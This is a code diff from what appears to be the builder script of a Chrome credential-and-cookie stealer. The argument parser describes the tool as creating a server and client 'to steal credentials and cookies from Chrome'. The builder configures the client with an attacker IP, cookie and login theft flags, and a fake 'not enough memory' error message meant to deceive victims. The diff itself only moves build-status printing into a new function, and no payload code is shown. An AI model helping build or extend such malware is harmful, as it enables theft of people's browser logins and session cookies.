@@ -102,9 +102,18 @@ def show_options():
         print(f"[-] Can't access file, make sure it's closed: {filename}")
 
 
+def build_message(server, client):
+    os.system("cls")
+    if not server:
+        print(f"[-] Error building the server")
+    if not client:
+        print(f"[-] Error building the client")
+    if server and client:
+        print(
+            f"[+] Build was successful. The file(s) should be in the directory: {dist_dir}")
+
+
 def parse_arguments():
-    error_server = False
-    error_client = False
     error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications."
     parser = argparse.ArgumentParser(
         description='Creates a server and client to steal credentials and cookies from Chrome')
@@ -143,14 +152,7 @@ def parse_arguments():
         server = build_server()
         client = build_client(ip_address=args.ip, error_bool=args.error_bool,
                               error_message=args.message, cookies=args.cookies_bool, login=args.login_bool)
-    os.system("cls")
-    if not server:
-        print(f"[-] Error building the server")
-    if not client:
-        print(f"[-] Error building the client")
-    if server and client:
-        print(
-            f"[+] Build was successful. The file(s) should be in the directory: {dist_dir}")
+    build_message(server, client)
 
 
 if __name__ == "__main__":
